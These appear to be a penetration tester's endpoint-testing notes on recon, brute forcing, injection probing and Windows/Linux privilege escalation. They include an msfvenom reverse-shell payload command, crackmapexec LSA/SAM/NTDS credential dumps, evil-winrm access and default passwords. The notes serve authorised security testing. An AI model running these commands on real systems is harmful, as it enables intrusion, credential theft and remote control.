## Overview 
Endpoint testing is usually focused on one of three areas: privilege escalation, persistence, or action on objectives. Identifying exploitable vulnerabilities in core operating system functions, software installed on the endpoint, or in misconfigurations of services is half the battle. Most endpoints will also have antivirus, EDR, or other security features in place that you will have to bypass. 
## Theory
### Target Research Methodology
- Initial Recon: 
	- Enumerate the open ports on the host and determine services accessible to you. 
	- Determine if these services allow interaction pre-authentication. 
	- Mark access points which require authentication for future review. 
- Brute Force Discovery:
	- Web services (including APIs) can be fuzzed using directory and DNS brute forcing. If the request header has a `Host` parameter, this can be used to enumerate subdomains rather than relying on DNS. 
	- Services like SMB, SSH, and FTP can be brute forced on occasion if there is no lockout policy in place. If there is a lockout policy, default credentials such as `root:root`, `root:toor`, and `admin:password` should still be attempted. 
		- Hydra, CrackMapExec, and NMAP can all be used for brute force credential guessing. 
- Error Fishing:
	- Attempt to use common control characters to break out of intended execution. Specifically, `;`,`--`,`|`,`>`,`'`, and `"` should be attempted before and after some expected input.
		- Example: `admin'-- -` to attempt SQL injection.
	- Switching protocols, request methods, connection options, etc. can bait out error messages with function names, software versions, etc. 
		- Example: PUT instead of POST for a login form. 
	- Any time an entry point can be fuzzed using an automated tool (Ex. SQLMap), this approach should be considered; however, note that automatic fuzzers have a tendency to crash applications and/or servers if not restricted properly. 
	- Timing attacks can also be used to get error messages. If input is multi-staged it can be useful to delay the second stage or submit multiple of the same stage before moving on. 
	- Tokens/Session Cookies can be deleted/modified to invalidate a session and cause errors. This can be useful when searching for token impersonation or client-side attacks. 
- Research: 
	- Once a service is discovered, the first step is to identify that service and common misconfigurations. Version numbers make vulnerability discovery very easy. 
	- If a service cannot be identified via normal channels, google port numbers, connect using `netcat` or a simple python listener, and research received output. 
## Tools/Commands
### Cisco 
#### Smart Install
### IoT Devices
#### Passback Attacks
### Docker
### Windows
https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
#### Unquoted Service Path
Find vulnerable services using PowerShell:
`Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName`
- [ ] .lnk files
- [ ] WTFBins
- [ ] BloodHound/SharpHound
- [ ] WinPEAS
Check write permissions in directory before the space: 
`Get-Acl C:\DirectoryName\`
Generate payload:
`msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f exe-service -o mal.exe`
- [ ] Petit Pottam
- [ ] DLL Hijacking
- [ ] DLL Sideloading
- [ ] DLL Injection
#### Access
##### AppDomain 
##### LOLBins
##### WinRM Shell
Port 5985 open, with credentials
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD>`
#### Privilege Escalation
##### Unquoted Service Path
##### Credential Caches
Dump credential caches
- `crackmapexec smb 127.0.0.1 -u $username -p $password --lsa`
- `crackmapexec smb 127.0.0.1 -u $username -p $password --sam`
Clone domain controller
- `crackmapexec smb 127.0.0.1 -u $username -p $password --ntds --users --enabled` (Requires DA, don't use this without permission from the client)
##### Named Pipe Exploits
##### Privilege Abuse
`SeImpersonate` or `SeAssignPrimaryToken` 
- RottenPotato, JuicyPotato, RoguePotato, PrintSpoofer, and SharpEfsPotato
##### Dropping Malware
Check write permissions in directory before the space: 
`Get-Acl C:\DirectoryName\`
Generate payload:
`msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f exe-service -o mal.exe`
### Linux
Check for `sudo no password` commands
- `sudo -l`
- [GTFOBins](https://gtfobins.github.io)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
Find files created by a user
- `find / -user $USER ! -path "*proc*" ! -path "*var*" ! -path "*dev*" 2>/dev/null`
- [ ] `sudo` version
- [ ] `ssh` version
- [ ] Kernel Exploits